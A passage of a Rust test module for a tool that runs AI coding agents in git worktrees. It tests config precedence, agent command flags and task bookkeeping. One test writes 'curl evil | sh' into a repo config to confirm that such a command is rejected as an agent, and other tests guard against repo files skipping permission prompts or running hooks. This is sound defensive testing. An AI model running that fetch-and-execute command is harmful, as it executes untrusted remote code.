        let schema: Value = serde_json::from_str(include_str!("../../../schemas/config.schema.json")).unwrap();
        let context = &schema["properties"]["planning"]["properties"]["context"];
        assert_eq!(context["default"], json!(PLANNING_CONTEXT));
        assert_eq!((context["oneOf"][0]["minimum"].clone(), context["oneOf"][0]["maximum"].clone()), (json!(CONTEXT_RANGE.start()), json!(CONTEXT_RANGE.end())));
        assert_eq!(context["oneOf"][1]["const"], "auto");
        assert_eq!(schema["properties"]["version"]["const"], json!(CONFIG_VERSION));
        assert!(schema["$id"].as_str().unwrap().ends_with(&format!("/v{CONFIG_VERSION}.schema.json")));
        let keys: Vec<&String> = schema["properties"]["planning"]["properties"].as_object().unwrap().keys().collect();
        assert_eq!(keys, ["agent", "context"], "a key in the schema Kanna doesn't read, or the other way round");
        let names: Vec<&str> = AGENTS.iter().map(|a| a.names[0]).collect();
        assert_eq!(schema["properties"]["planning"]["properties"]["agent"]["enum"], json!(names), "planning.agent names the agents a planning terminal offers");
        for section in ["shelf", "backlog"] {
            let runners = &schema["properties"][section]["properties"]["runners"];
            assert_eq!((runners["default"].clone(), runners["minimum"].clone(), runners["maximum"].clone()), (json!(RUNNERS), json!(0), json!(RUNNERS_MAX)));
            let keys: Vec<&String> = schema["properties"][section]["properties"].as_object().unwrap().keys().collect();
            assert_eq!(keys, ["runners"]);
        }
        let tasks = &schema["properties"]["tasks"]["properties"];
        assert_eq!((tasks["timeout"]["default"].clone(), tasks["timeout"]["minimum"].clone(), tasks["timeout"]["maximum"].clone()), (json!(task_scripts::TIMEOUT), json!(1), json!(task_scripts::TIMEOUT_MAX)));
        let keys: Vec<&String> = tasks.as_object().unwrap().keys().collect();
        assert_eq!(keys, ["agent", "setup", "teardown", "timeout"]);
        let prompts = &schema["properties"]["agents"]["properties"]["prompts"];
        assert_eq!((prompts["enum"].clone(), prompts["default"].clone()), (json!(["ask", "skip"]), json!("ask")));
        let keys: Vec<&String> = schema["properties"]["agents"]["properties"].as_object().unwrap().keys().collect();
        assert_eq!(keys, ["prompts"]);
        let keys: Vec<&String> = schema["properties"]["pipelines"]["properties"].as_object().unwrap().keys().collect();
        assert_eq!(keys, ["agents"]);
        let names: Vec<&str> = AGENTS.iter().map(|a| a.names[0]).collect();
        assert_eq!(schema["properties"]["pipelines"]["properties"]["agents"]["propertyNames"]["enum"], json!(names));
        assert_eq!((tasks["agent"]["default"].clone(), tasks["agent"]["examples"].clone()), (json!(DEFAULT_AGENT), json!(names)));
    }

    #[test]
    fn a_stage_agent_starts_with_its_session_and_resumes_it() {
        let first = "\"$(cat p.md)\"";
        assert_eq!(stage_agent("claude", None, None, Prompts::Ask, Some("u-1"), false, first), format!("claude --session-id 'u-1' {first}"));
        assert_eq!(stage_agent("claude", None, None, Prompts::Ask, Some("u-1"), true, first), format!("claude --resume 'u-1' {first}"));
        assert!(stage_agent("codex", None, None, Prompts::Ask, Some("r-2"), true, first).ends_with(&format!(" resume 'r-2' {first}")));
        assert!(stage_agent("codex", None, None, Prompts::Ask, None, true, first).ends_with(&format!(" resume --last {first}")));
    }

    #[test]
    fn a_pipeline_agent_command_comes_only_from_your_config() {
        let dir = std::env::temp_dir().join(format!("kanna-pipeline-agents-{}", std::process::id()));
        let _ = fs::remove_dir_all(&dir);
        fs::create_dir_all(&dir).unwrap();
        let (repo, mine) = (dir.join("repo.json"), dir.join("mine.json"));
        let files = [repo.clone(), mine.clone()];
        assert_eq!(pipeline_agent(&files, "claude"), "claude");
        fs::write(&repo, r#"{"pipelines": {"agents": {"claude": "/repo/evil"}}}"#).unwrap();
        assert_eq!(pipeline_agent(&files, "claude"), "claude");
        fs::write(&mine, r#"{"pipelines": {"agents": {"claude": "/fake/claude", "codex": " "}}}"#).unwrap();
        assert_eq!(pipeline_agent(&files, "claude"), "/fake/claude");
        assert_eq!(pipeline_agent(&files, "codex"), "codex");
        assert_eq!(pipeline_agent(&files, "opencode"), "opencode");
        fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn task_scripts_come_from_the_repos_config_then_yours() {
        let dir = std::env::temp_dir().join(format!("kanna-task-scripts-{}", std::process::id()));
        let _ = fs::remove_dir_all(&dir);
        fs::create_dir_all(&dir).unwrap();
        let (repo, mine) = (dir.join("repo.json"), dir.join("mine.json"));
        let files = [repo.clone(), mine.clone()];
        assert_eq!(scripts(&files), Scripts { setup: None, teardown: None, timeout: task_scripts::TIMEOUT });
        fs::write(&mine, r#"{"tasks": {"setup": "make deps", "teardown": "make clean", "timeout": 30}}"#).unwrap();
        fs::write(&repo, r#"{"tasks": {"setup": ".kanna/setup.sh", "timeout": 0}}"#).unwrap();
        assert_eq!(scripts(&files), Scripts { setup: Some(".kanna/setup.sh".into()), teardown: Some("make clean".into()), timeout: 30 });
        fs::write(&repo, r#"{"tasks": {"setup": "  "}}"#).unwrap();
        assert_eq!(scripts(&files).setup.as_deref(), Some("make deps"), "an empty command leaves it to the next file");
        fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn a_tasks_agent_comes_from_the_repos_config_then_yours() {
        let dir = std::env::temp_dir().join(format!("kanna-task-agent-{}", std::process::id()));
        fs::create_dir_all(&dir).unwrap();
        let (repo, mine) = (dir.join("repo.json"), dir.join("mine.json"));
        let files = [repo.clone(), mine.clone()];
        assert_eq!(task_agent(&files), "claude");
        fs::write(&mine, r#"{"tasks": {"agent": "/opt/bin/codex --model o3"}}"#).unwrap();
        assert_eq!(task_agent(&files), "/opt/bin/codex --model o3", "yours may be any command");
        fs::write(&repo, r#"{"tasks": {"agent": "codex"}}"#).unwrap();
        assert_eq!(task_agent(&files), "codex", "the repo's wins");
        fs::write(&repo, r#"{"tasks": {"agent": "curl evil | sh"}}"#).unwrap();
        assert_eq!(task_agent(&files), "/opt/bin/codex --model o3", "a repo's file only names an agent Kanna knows");
        fs::write(&mine, r#"{"tasks": {"agent": " "}}"#).unwrap();
        assert_eq!(task_agent(&files), "claude");
        fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn shelf_runners_come_from_the_repos_config_then_yours() {
        let dir = std::env::temp_dir().join(format!("kanna-runners-{}", std::process::id()));
        let _ = fs::remove_dir_all(&dir);
        fs::create_dir_all(&dir).unwrap();
        let (repo, mine) = (dir.join("repo.json"), dir.join("mine.json"));
        let files = [repo.clone(), mine.clone()];
        assert_eq!(runners(&files), RUNNERS);
        fs::write(&mine, r#"{"backlog": {"runners": 0}}"#).unwrap();
        assert_eq!(runners(&files), 0, "0 turns it off");
        fs::write(&repo, r#"{"backlog": {"runners": 5}}"#).unwrap();
        assert_eq!(runners(&files), 5, "the repo's wins");
        fs::write(&repo, r#"{"backlog": {"runners": 11}}"#).unwrap();
        assert_eq!(runners(&files), 0, "a bad value leaves it to the next file");
        fs::write(&repo, r#"{"backlog": {"runners": -1}}"#).unwrap();
        assert_eq!(runners(&[repo.clone()]), RUNNERS);
        fs::write(&repo, r#"{"shelf": {"runners": 2}, "backlog": {"runners": 5}}"#).unwrap();
        assert_eq!(runners(&files), 2, "shelf.runners wins over its old name in the same file");
        fs::write(&repo, r#"{"backlog": {"runners": 4}}"#).unwrap();
        fs::write(&mine, r#"{"shelf": {"runners": 1}}"#).unwrap();
        assert_eq!(runners(&files), 4, "the repo's old name wins over your new one");
        fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn the_planning_context_comes_from_the_repos_config_then_yours() {
        let dir = std::env::temp_dir().join(format!("kanna-planning-{}", std::process::id()));
        let _ = fs::remove_dir_all(&dir);
        fs::create_dir_all(dir.join("repo/.kanna")).unwrap();
        fs::create_dir_all(dir.join("home/.kanna-v4")).unwrap();
        let (repo, mine) = (dir.join("repo/.kanna/config.json"), dir.join("home/.kanna-v4/config.json"));
        let files = [repo.clone(), mine.clone()];
        assert_eq!(planning_context(&files), Some(PLANNING_CONTEXT), "no files: 300K");
        fs::write(&mine, r#"{"planning": {"context": 500000}}"#).unwrap();
        assert_eq!(planning_context(&files), Some(500_000));
        fs::write(&repo, r#"{"planning": {"context": "auto"}}"#).unwrap();
        assert_eq!(planning_context(&files), None, "the repo's wins");
        fs::write(&repo, r#"{"other": 1}"#).unwrap();
        assert_eq!(planning_context(&files), Some(500_000), "a file that doesn't set it leaves it to the next");
        fs::write(&repo, r#"{"version": 2, "planning": {"context": "auto"}}"#).unwrap();
        assert_eq!(planning_context(&files), Some(500_000), "a file for a newer Kanna is skipped");
        fs::write(&repo, r#"{"version": 1, "planning": {"context": "auto"}}"#).unwrap();
        assert_eq!(planning_context(&files), None);
        for (text, context) in [(r#"{"planning": {"context": 50}}"#, Some(PLANNING_CONTEXT)), ("not json", Some(PLANNING_CONTEXT))] {
            fs::write(&mine, text).unwrap();
            assert_eq!(planning_context(&[mine.clone()]), context, "{text}");
        }
        assert!(Command::new("git").arg("-C").arg(dir.join("repo")).args(["init", "-q"]).status().unwrap().success());
        let found = config_files(&dir.join("repo"));
        assert_eq!(found[0].canonicalize().ok(), repo.canonicalize().ok(), "{found:?}");
        assert!(found[1].ends_with(".kanna-v4/config.json"), "{found:?}");
        fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn agents_skip_permission_prompts_only_when_your_own_settings_say_so() {
        let dir = std::env::temp_dir().join(format!("kanna-prompts-{}", std::process::id()));
        let _ = fs::remove_dir_all(&dir);
        fs::create_dir_all(&dir).unwrap();
        let (repo, mine) = (dir.join("repo.json"), dir.join("mine.json"));
        let files = [repo.clone(), mine.clone()];
        assert_eq!(prompts(&files), Prompts::Ask, "unset asks");
        assert_eq!(prompts(&[]), Prompts::Ask);
        fs::write(&mine, r#"{"agents": {"prompts": "skip"}}"#).unwrap();
        assert_eq!(prompts(&files), Prompts::Skip);
        fs::write(&mine, r#"{"agents": {"prompts": "ask"}}"#).unwrap();
        assert_eq!(prompts(&files), Prompts::Ask);
        fs::write(&repo, r#"{"agents": {"prompts": "skip"}}"#).unwrap();
        assert_eq!(prompts(&files), Prompts::Ask, "a repo's file can't turn your prompts off");
        fs::remove_file(&mine).unwrap();
        assert_eq!(prompts(&files), Prompts::Ask, "nor set it when yours doesn't");
        for text in [r#"{"agents": {"prompts": true}}"#, r#"{"agents": {"prompts": "yolo"}}"#, r#"{"version": 2, "agents": {"prompts": "skip"}}"#] {
            fs::write(&mine, text).unwrap();
            assert_eq!(prompts(&files), Prompts::Ask, "{text}");
        }
        fs::remove_dir_all(&dir).unwrap();
    }


    #[test]
    fn agents_skip_permission_prompts_only_when_you_said_to_and_their_command_doesn_t_pick_a_mode() {
        assert_eq!(asking("codex", Prompts::Ask), "codex");
        assert_eq!(asking("claude --model opus", Prompts::Ask), "claude --model opus");
        assert_eq!(asking("codex --yolo", Prompts::Ask), "codex --yolo");
        assert_eq!(asking("codex", Prompts::Skip), "codex --yolo");
        assert_eq!(asking("/opt/bin/claude --model opus", Prompts::Skip), "/opt/bin/claude --model opus --dangerously-skip-permissions");
        assert_eq!(asking("claude --dangerously-skip-permissions", Prompts::Skip), "claude --dangerously-skip-permissions");
        assert_eq!(asking("claude --permission-mode plan", Prompts::Skip), "claude --permission-mode plan");
        assert_eq!(asking("codex --ask-for-approval=untrusted", Prompts::Skip), "codex --ask-for-approval=untrusted");
        assert_eq!(asking("codex -a untrusted", Prompts::Skip), "codex -a untrusted");
        assert_eq!(asking("agy", Prompts::Skip), "agy --dangerously-skip-permissions");
        assert_eq!(asking("agy --mode plan", Prompts::Skip), "agy --mode plan");
        assert_eq!(asking("opencode", Prompts::Skip), "opencode");
    }

    #[test]
    fn codex_runs_in_its_terminal_not_the_shared_server() {
        assert_eq!(in_its_terminal("/opt/bin/codex --yolo"), "/opt/bin/codex --yolo --no-daemon");
        assert_eq!(in_its_terminal("codex --no-daemon --yolo"), "codex --no-daemon --yolo");
        assert_eq!(in_its_terminal("claude"), "claude");
        let remote = ("'/K/kanna-daemon'", "'/s/kanna dev'");
        assert_eq!(wrapped("/opt/bin/codex --yolo", Some(remote), false), "'/K/kanna-daemon' --codex-remote '/s/kanna dev' /opt/bin/codex --yolo");
        assert_eq!(wrapped("claude", Some(remote), false), "claude");
    }

    #[test]
    fn claude_starts_with_your_account_only_when_you_have_one() {
        let remote = ("'/K/kanna-daemon'", "'/s/kanna dev'");
        assert_eq!(wrapped("claude --dangerously-skip-permissions", Some(remote), true), "'/K/kanna-daemon' --with-account '/s/kanna dev' claude --dangerously-skip-permissions");
        assert_eq!(wrapped("claude", None, true), "claude");
        assert_eq!(wrapped("codex", Some(remote), true), "'/K/kanna-daemon' --codex-remote '/s/kanna dev' codex");
    }

    #[test]
    fn entries_round_trip_through_the_db() {
        let entry = Entry { id: "task-0000c0de".into(), name: Some("Fix it".into()), message: None, repo: "/r".into(), by: Some("p2".into()), made_at: 5.0, agent: "codex".into(), folder: Some("/r/.kanna-worktrees/task-0000c0de".into()), session: Some("s".into()), held: Some("p3".into()), after: vec!["task-00000002".into()], stopped: Some("needs-you".into()), workspace: None, ready: Some(Mark { head: "abc".into(), branch: "fix-it".into(), at: 7.0 }), bases: vec![Base { id: "task-00000002".into(), branch: "b".into(), head: "def".into() }], stale: vec!["task-00000002".into()], conflict: Some(Conflict { heads: vec!["def".into()], why: "x".into() }), birth: Some("5000.0.k".into()), on: vec!["vm".into()] };
        assert_eq!(Entry::from_row(&entry.row(Place::Shelf, Some("p3"))), entry);
        assert_eq!(Entry::from_row(&entry.row(Place::Desk, Some("p3"))).held, None, "a task on the Shelf isn't held");
        assert_eq!(Entry::from_row(&entry.row(Place::Desk, Some("p3"))).stopped, None, "nor stopped by the Shelf");
    }

    #[test]
    fn a_worktree_gets_its_own_branch_and_is_kept_out_of_git_status() {
        let dir = std::env::temp_dir().join(format!("kanna-tasks-{}", std::process::id()));
        let _ = fs::remove_dir_all(&dir);
        fs::create_dir_all(&dir).unwrap();
        let git = |args: &[&str]| assert!(Command::new("git").arg("-C").arg(&dir).args(args).output().unwrap().status.success(), "git {args:?}");
        git(&["init", "-q", "-b", "main"]);
        git(&["-c", "user.email=t@t", "-c", "user.name=t", "commit", "-q", "--allow-empty", "-m", "first"]);
        let (folder, branch) = make_worktree(&dir, "task-1dfb12c2", None).unwrap();
        let name = "task-1dfb12c2".to_string();
        assert_eq!(folder, dir.join(".kanna-worktrees").join(&name).to_string_lossy());
        assert_eq!(branch, name);
        let current = Command::new("git").arg("-C").arg(&folder).args(["branch", "--show-current"]).output().unwrap();
        assert_eq!(String::from_utf8_lossy(&current.stdout).trim(), branch);
        let canonical = |p: PathBuf| p.canonicalize().unwrap();
        assert_eq!(project(Some(&format!("{folder}/src"))).map(canonical), Some(canonical(dir.clone())));
        assert_eq!(project(Some(dir.to_str().unwrap())).map(canonical), Some(canonical(dir.clone())));
        let status = Command::new("git").arg("-C").arg(&dir).args(["status", "--porcelain"]).output().unwrap();
        assert_eq!(String::from_utf8_lossy(&status.stdout), "");
        let hook = dir.join(".git/hooks/post-checkout");
        let marker = dir.join("hooked");
        fs::write(&hook, format!("#!/bin/sh\ntouch '{}'\n", marker.display())).unwrap();
        fs::set_permissions(&hook, std::os::unix::fs::PermissionsExt::from_mode(0o755)).unwrap();
        assert!(make_worktree(&dir, "task-1dfb12c2", None).is_err(), "a task's worktree is made once");
        let (other, _) = make_worktree(&dir, "task-00c0ffee", None).unwrap();
        assert_ne!(other, folder);
        assert!(!marker.exists(), "a repo's hooks ran");
        let exclude = fs::read_to_string(dir.join(".git/info/exclude")).unwrap();
        assert_eq!(exclude.matches("/.kanna-worktrees/").count(), 1);
        assert_eq!(exclude.matches("/.kanna/tmp/").count(), 1);
        fs::create_dir_all(Path::new(&other).join(".kanna/tmp")).unwrap();
        fs::write(Path::new(&other).join(".kanna/tmp/tour.md"), "# Tour\n").unwrap();
        let status = Command::new("git").arg("-C").arg(&other).args(["status", "--porcelain"]).output().unwrap();
        assert_eq!(String::from_utf8_lossy(&status.stdout), "", "a worktree's .kanna/tmp stays out of git status");
        fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn an_owner_away_is_asked_again_after_10s_doubling_to_5_minutes_until_it_answers() {
        let state = std::env::temp_dir().join(format!("kanna-away-{}", std::process::id()));
        let _ = fs::remove_dir_all(&state);
        fs::create_dir_all(&state).unwrap();
        let core = kanna_mux::Core::default();
        let tasks = Tasks::open(Rc::new(Db::open(&state)), &state, core.weak(), std::sync::mpsc::channel().0);
        let waits: Vec<u64> = (0..7).map(|_| {
            tasks.went_away("mbp".into());
            tasks.away.borrow()["mbp"].wait.as_secs()
        }).collect();
        assert_eq!(waits, [10, 20, 40, 80, 160, 300, 300]);
        assert!(tasks.is_away("mbp", Instant::now()) && !tasks.is_away("mbp", Instant::now() + Duration::from_secs(301)));
        assert!(!tasks.is_away("vm", Instant::now()));
        tasks.came_back("mbp");
        assert!(!tasks.is_away("mbp", Instant::now()));
        tasks.went_away("mbp".into());
        assert_eq!(tasks.away.borrow()["mbp"].wait.as_secs(), 10, "back, then away again, starts over");
        fs::remove_dir_all(&state).unwrap();
    }

    #[test]
    fn a_task_s_id_is_task_and_8_hex_digits_never_one_its_repo_has_a_worktree_or_branch_for() {
        let state = std::env::temp_dir().join(format!("kanna-hex-{}", std::process::id()));
        let _ = fs::remove_dir_all(&state);
        fs::create_dir_all(&state).unwrap();
        assert!(Command::new("git").arg("-C").arg(&state).args(["init", "-q"]).status().unwrap().success());
        let core = kanna_mux::Core::default();
        let tasks = Tasks::open(Rc::new(Db::open(&state)), &state, core.weak(), std::sync::mpsc::channel().0);
        let ids: HashSet<String> = (0..50).map(|_| tasks.mint(&json!({ "repo": state.to_str().unwrap() }), None, None).unwrap().id).collect();
        assert_eq!(ids.len(), 50);
        assert!(ids.iter().all(|id| db::is_task_id(id)), "{ids:?}");
        fs::create_dir_all(state.join(WORKTREES).join("task-1dfb12c2")).unwrap();
        assert!(taken(&state, "task-1dfb12c2") && !taken(&state, "task-00c0ffee"));
        fs::remove_dir_all(&state).unwrap();
    }

    #[test]
    fn a_task_is_made_and_started_only_in_a_project_at_its_place_in_repos() {
        let state = std::env::temp_dir().join(format!("kanna-outside-{}", std::process::id()));
        let _ = fs::remove_dir_all(&state);
        let (outside, inside) = (state.join("work/app"), state.join("repos/local/app"));
        for repo in [&outside, &inside] {
            fs::create_dir_all(repo).unwrap();
            assert!(Command::new("git").arg("-C").arg(repo).args(["init", "-q"]).status().unwrap().success());
        }
        let core = kanna_mux::Core::default();
        let tasks = Tasks::open(Rc::new(Db::open(&state)), &state, core.weak(), std::sync::mpsc::channel().0);
        *tasks.repos.borrow_mut() = Some(state.join("repos"));
        let refused = tasks.add(&json!({ "repo": outside.to_str().unwrap(), "name": "Out" })).unwrap_err();
        assert_eq!(refused.code, "outside");
        assert!(refused.message.contains("`kanna project import ") && refused.message.ends_with("repos/local/app)"), "{}", refused.message);
        assert!(tasks.add(&json!({ "repo": inside.to_str().unwrap(), "name": "In" })).is_ok());
        let old = Entry { id: "task-00000001".into(), repo: outside.to_string_lossy().into(), agent: "claude".into(), ..Default::default() };
        assert_eq!(tasks.startable(&old).unwrap_err().code, "outside", "a task an older Kanna made outside doesn't start");
        let asked = |path: &Path| tasks.asked(&json!({ "path": path })).map(|r| r["never"].clone());
        fs::create_dir_all(outside.join("sub")).unwrap();
        assert_eq!(asked(&outside.join("sub")), Ok(json!(false)));
        assert_eq!(tasks.never(&json!({ "path": outside.join("sub") })).unwrap()["path"], json!(outside.canonicalize().unwrap()), "never is the project's, not the subfolder's");
        assert_eq!(asked(&outside), Ok(json!(true)));
        assert_eq!(asked(&inside).unwrap_err().code, "in_place");
        *tasks.importing.borrow_mut() = Some(project_import::Import { from: inside.canonicalize().unwrap(), to: state.join("repos/a/app") });
        assert_eq!(tasks.add(&json!({ "repo": inside.to_str().unwrap(), "name": "Late" })).unwrap_err().code, "importing");
        fs::remove_dir_all(&state).unwrap();
    }

    #[test]
    fn a_task_is_found_by_its_id_its_pane_or_a_unique_start_of_its_id() {
        let state = std::env::temp_dir().join(format!("kanna-prefix-{}", std::process::id()));
        let _ = fs::remove_dir_all(&state);
        fs::create_dir_all(&state).unwrap();
        let core = kanna_mux::Core::default();
        let tasks = Tasks::open(Rc::new(Db::open(&state)), &state, core.weak(), std::sync::mpsc::channel().0);
        let task = |id: &str, name: &str| Entry { id: id.into(), name: Some(name.into()), repo: "/r".into(), agent: "claude".into(), ..Default::default() };
        for (id, name) in [("task-1dfb12c2", "One"), ("task-1d0e44aa", "Two")] {
            tasks.store(&task(id, name), Place::Shelf, None, None).unwrap();
            tasks.entries.borrow_mut().push(task(id, name));
        }
        tasks.running.borrow_mut().push(Running { pane: "p7".into(), entry: task("task-c0ffee00", "Out"), place: Place::Desk });
        let found = |reference: &str| tasks.resolve(reference).map_err(|e| (e.code, e.message));
        assert_eq!(found("task-1dfb12c2"), Ok(Some("task-1dfb12c2".into())));
        assert_eq!(found("1dfb"), Ok(Some("task-1dfb12c2".into())));
        assert_eq!(found("task-1DF"), Ok(Some("task-1dfb12c2".into())));
        assert_eq!(found("c0f"), Ok(Some("task-c0ffee00".into())), "a task on the Shelf");
        assert_eq!(tasks.pane_or("task-c0ffee00"), "p7");
        let (code, message) = found("task-1d").unwrap_err();
        assert_eq!(code, "ambiguous");
        assert!(message.contains("task-1dfb \"One\"") && message.contains("task-1d0e \"Two\""), "{message}");
        assert_eq!(tasks.short("task-c0ffee00"), "task-c0ff");
        assert_eq!(found("task-"), Ok(None));
        assert_eq!(found("beef"), Ok(None));
        assert_eq!(found("t134"), Ok(None), "an old ID names nothing");
        fs::remove_dir_all(&state).unwrap();
    }

    #[test]
    fn the_view_lists_the_desk_s_tasks_with_when_each_was_made() {
        let state = std::env::temp_dir().join(format!("kanna-desk-made-{}", std::process::id()));
        let _ = fs::remove_dir_all(&state);
        fs::create_dir_all(&state).unwrap();
        let core = kanna_mux::Core::default();
        let tasks = Tasks::open(Rc::new(Db::open(&state)), &state, core.weak(), std::sync::mpsc::channel().0);
        let task = |id: &str, made_at: f64| Entry { id: id.into(), repo: "/r".into(), agent: "claude".into(), made_at, ..Default::default() };
        tasks.entries.borrow_mut().push(task("task-0000aaaa", 1.0));
        for (id, made_at) in [("task-0000dddd", 20.0), ("task-0000bbbb", 30.0), ("task-0000cccc", 20.0)] {
            tasks.store(&task(id, made_at), Place::Desk, None, None).unwrap();
        }
        for (pane, id, made_at) in [("p7", "task-0000bbbb", 30.0), ("p9", "task-0000cccc", 20.0), ("p8", "task-0000dddd", 20.0)] {
            tasks.running.borrow_mut().push(Running { pane: pane.into(), entry: task(id, made_at), place: Place::Desk });
        }
        let view = tasks.view();
        assert_eq!(view["shelf"].as_array().map(Vec::len), Some(1), "the Shelf's tasks");
        let desk: Vec<(&str, f64)> = view["desk"].as_array().unwrap().iter().map(|t| (t["pane"].as_str().unwrap(), t["madeAt"].as_f64().unwrap())).collect();
        assert_eq!(desk, vec![("p8", 20.0), ("p9", 20.0), ("p7", 30.0)], "oldest first, a tie in the order they were made");
        fs::remove_dir_all(&state).unwrap();
    }

    #[test]
    fn a_task_names_its_workspace_and_follows_it_by_its_agent_s_pane() {
        let state = std::env::temp_dir().join(format!("kanna-workspace-{}", std::process::id()));
        let _ = fs::remove_dir_all(&state);
        fs::create_dir_all(&state).unwrap();
        let core = kanna_mux::Core::default();
        let tasks = Tasks::open(Rc::new(Db::open(&state)), &state, core.weak(), std::sync::mpsc::channel().0);
        let task = |id: &str, name: &str| Entry { id: id.into(), name: Some(name.into()), repo: "/r".into(), agent: "claude".into(), ..Default::default() };
        tasks.store(&task("task-1dfb12c2", "Waiting"), Place::Shelf, None, None).unwrap();
        tasks.entries.borrow_mut().push(task("task-1dfb12c2", "Waiting"));
        let out = task("task-c0ffee00", "Out");
        tasks.store(&out, Place::Desk, Some("p7"), None).unwrap();
        tasks.running.borrow_mut().push(Running { pane: "p7".into(), entry: out, place: Place::Desk });
        let of = |reference: &str| tasks.workspace_of(reference).map(|r| r.map_err(|e| (e.code, e.message)));
        assert_eq!(of("ws-3"), None, "a workspace's own ID goes to the layout as it is");
        assert_eq!(of("c0ff"), Some(Err(("not_started".into(), "task-c0ff hasn't started, so it has no workspace yet".into()))));
        assert_eq!(tasks.task_in("ws-3"), None);
        tasks.sync_workspaces(&[json!({ "id": "ws-3", "dock": { "id": "p7", "pane": "Out" } }), json!({ "id": "ws-4", "dock": { "id": "p9" } })]);
        assert_eq!(of("task-c0ffee00"), Some(Ok("ws-3".into())));
        assert_eq!(tasks.task_in("ws-3"), Some(("task-c0ffee00".into(), Some("Out".into()))));
        assert_eq!(tasks.task_in("ws-4"), None, "a workspace with no task's agent docked has no task");
        assert_eq!(of("task-1dfb"), Some(Err(("not_started".into(), "task-1dfb hasn't started, so it has no workspace yet".into()))));
        let again = Tasks::open(Rc::new(Db::open(&state)), &state, core.weak(), std::sync::mpsc::channel().0);
        assert_eq!(again.task_in("ws-3"), Some(("task-c0ffee00".into(), Some("Out".into()))), "the task's workspace survives a restart");
        fs::remove_dir_all(&state).unwrap();
    }

    #[test]
    fn with_runners_0_an_ended_turn_is_left_alone_until_its_agent_works_again() {
        let state = std::env::temp_dir().join(format!("kanna-runners-0-{}", std::process::id()));
        let _ = fs::remove_dir_all(&state);
        fs::create_dir_all(state.join(".kanna")).unwrap();
        assert!(Command::new("git").arg("-C").arg(&state).args(["init", "-q"]).status().unwrap().success());
        fs::write(state.join(".kanna/config.json"), r#"{"backlog": {"runners": 0}}"#).unwrap();
        let core = kanna_mux::Core::default();
        let mut agent = Pane::new("term-7", None, kanna_mux::PaneType::Term);
        agent.state = PaneState::Running;
        agent.status = Some("idle".into());
        core.install_panes(vec![agent], 0, 7);
        let tasks = Rc::new(Tasks::open(Rc::new(Db::open(&state)), &state, core.weak(), std::sync::mpsc::channel().0));
        let entry = Entry { id: "task-1dfb12c2".into(), repo: state.to_str().unwrap().into(), agent: "claude".into(), held: Some("term-7".into()), ..Default::default() };
        tasks.entries.borrow_mut().push(entry);
        tasks.turns.borrow_mut().insert("term-7".into(), Turn::underway());
        tasks.status("term-7", Some("idle"), true);
        for _ in 0..2 {
            let due = tasks.tick();
            assert!(due.is_some_and(|at| at > Instant::now()), "nothing is overdue, so the daemon sleeps");
            assert_eq!(tasks.turns.borrow()["term-7"].ended(Instant::now() + Duration::from_secs(3)), None, "the ended turn came back");
            assert!(tasks.quitting.borrow().is_empty(), "runners 0 stops none");
        }
        tasks.status("term-7", Some("working"), false);
        tasks.status("term-7", Some("idle"), true);
        assert!(tasks.turns.borrow()["term-7"].ended(Instant::now()).is_some(), "its next turn is tracked again");
        fs::remove_dir_all(&state).unwrap();
    }

    #[test]
    fn an_id_is_never_handed_out_twice_across_a_restart() {
        let state = std::env::temp_dir().join(format!("kanna-ids-{}", std::process::id()));
        let _ = fs::remove_dir_all(&state);
        fs::create_dir_all(&state).unwrap();
        assert!(Command::new("git").arg("-C").arg(&state).args(["init", "-q"]).status().unwrap().success());
        let core = kanna_mux::Core::default();
        let args = json!({ "repo": state.to_str().unwrap() });
        let tasks = Tasks::open(Rc::new(Db::open(&state)), &state, core.weak(), std::sync::mpsc::channel().0);
        let ran = Entry { id: "task-00000009".into(), name: Some("Ran".into()), message: None, repo: "/r".into(), by: None, made_at: 0.0, agent: "claude".into(), folder: Some("/r/w".into()), session: Some("s".into()), held: None, ..Default::default() };
        tasks.store(&ran, Place::Desk, Some("p4"), Some(Change::new("picked"))).unwrap();
        let again = Tasks::open(Rc::new(Db::open(&state)), &state, core.weak(), std::sync::mpsc::channel().0);
        assert_eq!(*again.running.borrow(), vec![Running { pane: "p4".into(), entry: ran, place: Place::Desk }], "a running task's way back survives a restart");
        let ids: HashSet<String> = (0..20).map(|_| again.mint(&args, None, None).unwrap().id).collect();
        assert!(!ids.contains("task-00000009"), "and its ID isn't handed out again");
        fs::remove_dir_all(&state).unwrap();
    }

    #[test]
    fn a_task_moved_back_to_the_shelf_is_listed_by_when_it_was_made() {
        let state = std::env::temp_dir().join(format!("kanna-order-{}", std::process::id()));
        let _ = fs::remove_dir_all(&state);
        fs::create_dir_all(&state).unwrap();
        assert!(Command::new("git").arg("-C").arg(&state).args(["init", "-q"]).status().unwrap().success());
        let core = kanna_mux::Core::default();
        let tasks = Rc::new(Tasks::open(Rc::new(Db::open(&state)), &state, core.weak(), std::sync::mpsc::channel().0));
        let repo = state.to_str().unwrap();
        let mut made = vec![];
        for (at, name) in [(3.0, "Newest"), (1.0, "Oldest"), (2.0, "Middle")] {
            let entry = Entry { made_at: at, ..tasks.mint(&json!({ "repo": repo }), Some(name.into()), None).unwrap() };
            tasks.store(&entry, Place::Shelf, None, Some(Change::new("made"))).unwrap();
            made.push((at, entry.id.clone()));
            insert_in_order(&mut tasks.entries.borrow_mut(), entry);
        }
        made.sort_by(|a, b| a.0.total_cmp(&b.0));
        let made: Vec<String> = made.into_iter().map(|(_, id)| id).collect();
        let listed = |tasks: &Tasks| tasks.list(&json!({}))["shelf"].as_array().unwrap().iter().map(|t| string(t, "id").unwrap().to_string()).collect::<Vec<_>>();
        assert_eq!(listed(&tasks), made);
        let opened = core.handle_blocking(json!({ "cmd": "open", "args": { "type": "term", "name": "agent", "dock": "left", "task": made[0] } }));
        let pane = core.pane("agent").unwrap_or_else(|| panic!("{opened}")).id;
        let oldest = tasks.take(&made[0]).unwrap();
        tasks.store(&oldest, Place::Desk, Some(&pane), Some(Change::new("picked"))).unwrap();
        tasks.record(&pane, oldest, Place::Desk);
        let (responder, answer) = kanna_mux::responder();
        tasks.shelve(&json!({ "task": pane }), responder);
        let std::task::Poll::Ready(shelved) = std::future::Future::poll(std::pin::pin!(answer), &mut std::task::Context::from_waker(std::task::Waker::noop())) else { panic!("shelve didn't answer") };
        let shelved = shelved.unwrap();
